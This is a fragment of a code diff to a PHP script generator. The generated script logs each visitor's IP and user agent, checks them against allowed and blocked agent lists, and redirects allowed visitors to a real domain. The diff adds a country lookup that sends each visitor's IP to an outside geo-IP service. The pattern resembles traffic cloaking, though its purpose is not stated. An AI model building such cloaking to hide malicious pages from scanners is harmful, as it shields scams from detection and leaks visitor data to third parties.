@@ -213,6 +213,14 @@ function checkIP($ip)
     }
 }
 
+function checkCountry($ip)
+{
+    $json = file_get_contents("http://freegeoip.net/json/{$ip}");
+    return json_decode($json)->country_code;
+}
+
+$country = checkCountry($_SERVER[\'REMOTE_ADDR\']);
+
 $allowedAgents = "allowedAgents' . $pathname . '.txt";
 $blockedAgents = "blockedAgents' . $pathname . '.txt";
 
@@ -233,7 +241,7 @@ if (
     $agent = $_SERVER[\'REMOTE_ADDR\'] . \' \' . $_SERVER[\'HTTP_USER_AGENT\'] . \' ok \' . PHP_EOL;
     fwrite($fAgent, $agent);
     fclose($fAgent);
-    echo "' . $redirectString . '";
+    header(\'Location: ' . $realDomain . '\', true, 301);
     die();
 }
 
